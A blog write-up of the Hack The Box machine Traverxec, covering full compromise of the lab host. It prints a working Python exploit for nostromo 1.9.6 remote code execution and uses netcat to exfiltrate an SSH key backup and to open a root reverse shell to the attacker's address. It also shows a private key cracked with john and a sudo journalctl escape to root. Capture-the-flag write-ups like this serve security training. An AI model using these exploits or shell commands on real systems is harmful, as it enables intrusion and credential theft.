---
layout: single
title: Traverxec - Hack The Box
excerpt: "This time we will exploit the nostromo web server, using a public script to obtain RCE and then we will do it manually with BurpSuite. We will get access to the system as www-data and we will escalate to the user David finding some hidden files thanks to a server configuration file, finally we will gain root access by abusing the journalctl binary that can be executed as sudo. "
date: 2021-09-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-traverxec/traverxec_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - Web
  - File Misconfiguration
  - nostromo
  - BurpSuite
  - GTFOBins
  - 
---

![](/assets/images/htb-writeup-traverxec/traverxec_logo.png)

# Description

This time we will exploit the nostromo web server, using a public script to obtain RCE and then we will do it manually with BurpSuite. We will get access to the system as www-data and we will escalate to the user David finding some hidden files thanks to a server configuration file, finally we will gain root access by abusing the journalctl binary that can be executed as sudo. 

![](/assets/images/htb-writeup-traverxec/traverxec-statics.png)

<br>
# Recognition phase

The normal scan with nmap is very slow so we launch a TCP Syn Port Scan.

```
$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.165 -oG allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We launch basic enumeration and version detection scripts and services running on ports with open status.
```
$ nmap -sC -sV -p22,80 10.10.10.165 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ports analysis.

- The ssh version has no critical vulnerabilities that we can use.
- Nmap reports that the website is running nostromo server 1.9.6. Googling we quickly found that this version is potential to Directory Traversal RCE.

## http://traverxec.htb/

![](/assets/images/htb-writeup-traverxec/principal-page-web.png)

Let's look for an exploit to understand how to exploit the vulnerability.

```
searchsploit nostromo               
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                                                                     | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                                                                                                   | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                                                     | linux/remote/35466.sh
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```


```
#!/usr/bin/env python



import sys
import socket

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):

    response = ""

    try:

        while True:

            connection = soc.recv(1024)

            if len(connection) == 0:

                break

            response += connection

    except:

        pass

    return response



def cve(target, port, cmd):

    soc = socket.socket()

    soc.connect((target, int(port)))

    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)

    soc.send(payload)

    receive = connect(soc)

    print(receive)


if __name__ == "__main__":

    print(art)

    try:

        target = sys.argv[1]

        port = sys.argv[2]

        cmd = sys.argv[3]


        cve(target, port, cmd)


    except IndexError:

        print(help_menu)

```

## Exploiting the vulnerability with the script.

```
python nostromo-exploit.py 10.10.10.165 80 "whoami"

HTTP/1.1 200 OK
Date: Mon, 30 Aug 2021 20:09:14 GMT
Server: nostromo 1.9.6
Connection: close


www-data
```

## Exploiting the vulnerability with BurpSuite.

We open BurpSuite, select the target, intercept a request to the website and send it to the repeater.

With secondary click we change the GET method to POST method and replace everything as indicated in the script.

![](/assets/images/htb-writeup-traverxec/repeater.png)

We listen on port 443 and let the request continue.

```
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.165] 46392
www-data
```

Send a reverse shell.

![](/assets/images/htb-writeup-traverxec/send-reverse-shell.png)

```
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.165] 46394
whoami
www-data
```

We do a tty treatment to have a fully interactive shell with the following sequence of commands.

```
script /dev/null -c bash

Ctrl+Z
stty raw -echo
fg
reset
xterm
export TERM=xterm-256color
export SHELL=bash
```

In our attacker machine with the command ```stty -a``` we see the rows and columns that our shell has. 
Now in the victim computer we indicate our number of rows and columns to finish the treatment, this will make the proportions are correct.

```
stty rows 42 columns 189
```

<br>
# Privilege Escalation

## www-data to david

A good practice that I always recommend is to examine the website's archives. 

```
www-data@traverxec:/$ cd /var/

www-data@traverxec:/var$ ls -la
total 48
drwxr-xr-x 12 root root  4096 Oct 25  2019 .
drwxr-xr-x 18 root root  4096 Oct 25  2019 ..
drwxr-xr-x  2 root root  4096 Aug 31 06:25 backups
drwxr-xr-x  9 root root  4096 Oct 25  2019 cache
drwxr-xr-x 26 root root  4096 Nov 12  2019 lib
drwxrwsr-x  2 root staff 4096 May 13  2019 local
lrwxrwxrwx  1 root root     9 Oct 25  2019 lock -> /run/lock
drwxr-xr-x  5 root root  4096 Aug 30 13:29 log
drwxrwsr-x  2 root mail  4096 Oct 25  2019 mail
drwxr-xr-x  6 root root  4096 Oct 25  2019 nostromo
drwxr-xr-x  2 root root  4096 Oct 25  2019 opt
lrwxrwxrwx  1 root root     4 Oct 25  2019 run -> /run
drwxr-xr-x  4 root root  4096 Oct 25  2019 spool
drwxrwxrwt  3 root root  4096 Aug 31 00:00 tmp

www-data@traverxec:/var$ cd nostromo/

www-data@traverxec:/var/nostromo$ ls -la
total 24
drwxr-xr-x  6 root     root   4096 Oct 25  2019 .
drwxr-xr-x 12 root     root   4096 Oct 25  2019 ..
drwxr-xr-x  2 root     daemon 4096 Oct 27  2019 conf
drwxr-xr-x  6 root     daemon 4096 Oct 25  2019 htdocs
drwxr-xr-x  2 root     daemon 4096 Oct 25  2019 icons
drwxr-xr-x  2 www-data daemon 4096 Aug 30 13:29 logs
```

We see a configuration file, interesting, let's see what's in it.

```
www-data@traverxec:/var/nostromo$ cd conf/

www-data@traverxec:/var/nostromo/conf$ ls -la
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .
drwxr-xr-x 6 root root   4096 Oct 25  2019 ..
-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes
-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf
```

## .htpasswd
```
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

## mimes
The mimes file has nothing that can help us.

## nhttpd.conf
```
data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

### Analysis of the found files.

- The .htpasswd file seems to have a hashed password, we save it in our attacker's computer to try to break it with john.
- The nhttpd.conf file is a web server configuration file. It stores information about various server functions. 

Let's review all the files and directories that are in the nhttpd.conf configuration file.	

```
www-data@traverxec:/var/nostromo/conf$ cd /var/nostromo/htdocs

www-data@traverxec:/var/nostromo/htdocs$ ls -la
total 48
drwxr-xr-x 6 root daemon  4096 Oct 25  2019 .
drwxr-xr-x 6 root root    4096 Oct 25  2019 ..
-rw-r--r-- 1 root root     203 Aug 14  2018 Readme.txt
drwxr-xr-x 2 root root    4096 Nov  3  2018 css
-rw-r--r-- 1 root root      55 Oct 25  2019 empty.html
drwxr-xr-x 3 root root    4096 Nov  3  2018 img
-rw-r--r-- 1 root root   15674 Oct 25  2019 index.html
drwxr-xr-x 2 root root    4096 Nov  3  2018 js
drwxr-xr-x 9 root root    4096 Nov  3  2018 lib

www-data@traverxec:/var/nostromo/htdocs$ cat read
cat: read: No such file or directory

www-data@traverxec:/var/nostromo/htdocs$ cat Readme.txt 
Thanks for downloading this template!

Template Name: Basic
Template URL: https://templatemag.com/basic-bootstrap-personal-template/
Author: TemplateMag.com
```

```
www-data@traverxec:/var/nostromo/conf$ ls -la /home/
total 12
drwxr-xr-x  3 root  root  4096 Oct 25  2019 .
drwxr-xr-x 18 root  root  4096 Oct 25  2019 ..
drwx--x--x  5 david david 4096 Oct 25  2019 david
```

We have permissions to traverse david's directory but we don't have read permissions, this is rare.

```
www-data@traverxec:/home/david$ ls -la
ls: cannot open directory '.': Permission denied
```

We can't view the files because we don't have permissions, but here we should try to guess a potential existing directory or file.

```
www-data@traverxec:/home/david$ cat user.txt
cat: user.txt: Permission denied

www-data@traverxec:/home/david$ cat idontexist.txt
cat: idontexist.txt: No such file or directory
```

You can see the difference, the user.txt file exists but we cannot view its contents. This could be because the user david has hidden files or folders in which only knowing its name could be accessed and displayed.

To discard the directory from the last line of the nhttpd.conf public_www file we find the following.

```
www-data@traverxec:/home/david$ ls -la public_www
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```

## index.html
```
www-data@traverxec:/home/david/public_www$ cat index.html 
<html>
<head>
<style>
html { 
  font-family: sans-serif; 
  color: rgb(128,96,0);
  background: url(/img/portfolio/portfolio_03.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
</style>
</head><body><font style="sans-serif"><h1>Private space.<br>Nothing here.<br>Keep out!</h1></body></html>
```

## protected-file-area

```
www-data@traverxec:/home/david/public_www$ cd protected-file-area/

www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```

```
www-data@traverxec:/home/david/public_www/protected-file-area$ cat .htaccess 
realm David's Protected File Area. Keep out!
```

We transfer the backup-ssh-identity-files.tgz file to our computer and analyze what it contains.

### Victim machine
```
www-data@traverxec:/home/david/public_www/protected-file-area$ nc 10.10.14.15 443 < backup-ssh-identity-files.tgz
```

### Atacker machine
```
nc -nlvp 443 > backup-ssh-identity-files.tgz
```

```
$ 7z l backup-ssh-identity-files.tgz

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2019-10-25 23:02:59 .....        10240         1915  backup-ssh-identity-files.tar
------------------- ----- ------------ ------------  ------------------------
2019-10-25 23:02:59              10240         1915  1 files
```

Extract and list the contents of backup-ssh-identity-files.tar

```
$ 7z x backup-ssh-identity-files.tgz

$ 7z l backup-ssh-identity-files.tar

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2019-10-25 23:02:50 D....            0            0  home/david/.ssh
2019-10-25 23:02:50 .....          397          512  home/david/.ssh/authorized_keys
2019-10-25 23:02:21 .....         1766         2048  home/david/.ssh/id_rsa
2019-10-25 23:02:44 .....          397          512  home/david/.ssh/id_rsa.pub
------------------- ----- ------------ ------------  ------------------------
2019-10-25 23:02:50               2560         3072  3 files, 1 folders

$ cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```

We have an id_rsa with password, we have to convert it to hash and then try to break it with john.

```
$ ssh2john.py id_rsa > hash-id_rsa

$ cat hash-id_rsa
id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-id_rsa
hunter           (id_rsa)
```

We were able to break the hash, the password is hunter, now we have to assign permissions 600 to the id_rsa and use it to log in as david via ssh.

```
$ chmod 600 id_rsa

$ ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Tue Aug 31 17:26:37 2021 from 10.10.14.15
david@traverxec:~$ whoami
david
david@traverxec:~$ hostname -I
10.10.10.165 
```
<br>
Excellent! now let's go for the root.

## David to root

Now we can see the content of david's directory, we find the bin folder.

```
david@traverxec:~$ ls -la
total 40
drwx--x--x 6 david david 4096 Sep  1 15:38 .
drwxr-xr-x 3 root  root  4096 Oct 25  2019 ..
lrwxrwxrwx 1 root  root     9 Oct 25  2019 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Oct 25  2019 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25  2019 .bashrc
drwxr-xr-x 3 david david 4096 Sep  1 15:38 .local
-rw-r--r-- 1 david david  807 Oct 25  2019 .profile
drwx------ 2 david david 4096 Oct 25  2019 .ssh
drwx------ 2 david david 4096 Sep  1 15:38 bin
drwxr-xr-x 3 david david 4096 Oct 25  2019 public_www
-r--r----- 1 root  david   33 Oct 25  2019 user.txt
```

List their contents.

```
david@traverxec:~$ cd bin/
david@traverxec:~/bin$ ls -la
total 16
drwx------ 2 david david 4096 Sep  1 15:38 .
drwx--x--x 6 david david 4096 Sep  1 15:38 ..
-r-------- 1 david david  802 Oct 25  2019 server-stats.head
-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
```

## server-stats.head

```
cat server-stats.head 
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""' 
```

## server-stats.sh

```
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

In the server-stats.sh script we see that the journalctl binary is executed as sudo, journalctl is a tool used to access system logs.

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-- Logs begin at Wed 2021-09-01 15:31:11 EDT, end at Wed 2021-09-01 16:00:45 EDT. --
Sep 01 15:31:13 traverxec systemd[1]: Starting nostromo nhttpd server...
Sep 01 15:31:13 traverxec nhttpd[419]: started
Sep 01 15:31:13 traverxec nhttpd[419]: max. file descriptors = 1040 (cur) / 1040 (max)
Sep 01 15:31:13 traverxec systemd[1]: Started nostromo nhttpd server.
```

We can run the journalctl binary as sudo, what we should do now is look in [GTFObins](https://gtfobins.github.io/) to see if the binary is vulnerable.

![](/assets/images/htb-writeup-traverxec/gtfobins-journalctl.png)

The binary is vulnerable, in the description we see that highlights the word less and also to exploit the vulnerability tells us that we must run the binary and then write !/bin/sh, this is related because when we have to exploit a binary with a !/bin/sh is because we must exploit it in a less type format, less means that let us scroll up or down to see the contents of the console. Basically what we have to do to exploit it is to shrink the window of the console in such a way that it allows us to scroll to see the total of content, since if we have it in a big window it will show us all the content without problems and it will not allow us to scroll. This is explained in a very simple way but it is so that it is understood better. 

Now let's see a more practical example in case it was not understood:

We remove the pipe with cat since it could affect the way to exploit the vulnerability, the cat we can remove it without problems, the only thing that we should not remove are the parameters since surely this configured so that only the parameters that the script indicates can be executed as sudo.

<br>
### If we run the binary in a large window, it will obviously not let us scroll to see the total content.

![](/assets/images/htb-writeup-traverxec/journalctl-fullscreen.png)

### Now we shrink the window so that it is displayed in a smaller format.

![](/assets/images/htb-writeup-traverxec/journalctl-less.png)

<br>
Now that we have it in less format, if we write the line that indicates GTFOBins the following happens:

![](/assets/images/htb-writeup-traverxec/journalctl-less-root.png)

Ready! this is how to exploit a binary in less type, basically you have to shrink the window to put it in less format and let us scroll up and down to see all the content, this way we can write in the same context of execution of the binary (I explain it this way so that it is easily understood). 
Then we can send us a reverse shell and the job is done.

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Wed 2021-09-01 15:31:11 EDT, end at Wed 2021-
Sep 01 15:31:13 traverxec systemd[1]: Starting nostromo nhttpd
Sep 01 15:31:13 traverxec nhttpd[419]: started
Sep 01 15:31:13 traverxec nhttpd[419]: max. file descriptors =
Sep 01 15:31:13 traverxec systemd[1]: Started nostromo nhttpd 
!/bin/sh
# whoami
root
# nc -c /bin/bash 10.10.14.15 443
```

```
$ nc -nlvp 443
[sudo] password for lib: 
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.165] 42044
whoami
root
```

We do a tty treatment as we did before and that's it.

Good job!
